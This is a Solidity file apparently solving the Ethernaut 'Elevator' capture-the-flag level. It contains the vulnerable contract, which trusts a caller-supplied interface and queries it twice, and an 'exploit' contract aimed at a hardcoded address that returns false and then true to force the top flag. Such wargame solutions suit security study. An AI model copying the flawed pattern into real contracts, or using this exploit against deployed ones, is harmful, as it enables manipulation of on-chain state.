// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract exploit {
    Elevator target = Elevator(0xF93Bc03899F07610E7d490Ab89bf7B781b90D1c2);
    bool flag;

    function attack() public {
        target.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (flag == false) {
            flag = true;
            return false;
        }
        else
            return true;
    }
}